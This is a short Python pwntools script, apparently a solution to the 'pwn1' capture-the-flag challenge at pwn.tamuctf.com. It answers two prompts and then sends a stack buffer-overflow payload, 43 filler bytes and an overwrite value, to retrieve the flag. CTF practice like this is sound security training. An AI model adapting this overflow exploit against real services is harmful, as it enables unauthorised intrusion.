#!/usr/bin/env python2
from pwn import *

ans1 = 'Sir Lancelot of Camelot' 
ans2 = 'To seek the Holy Grail.'
payload = 'A'*43 + '\xc8\x10\xa1\xde'

#conn = process('./pwn1')
conn = remote('pwn.tamuctf.com', 4321)
print conn.recvuntil('name?', drop=False)
print ans1
conn.sendline(ans1)
print conn.recvuntil('quest?', drop=False)
print ans2
conn.sendline(ans2)
print conn.recvuntil('secret?', drop=False)
conn.sendline(payload)
print conn.recvuntil('}', drop=False)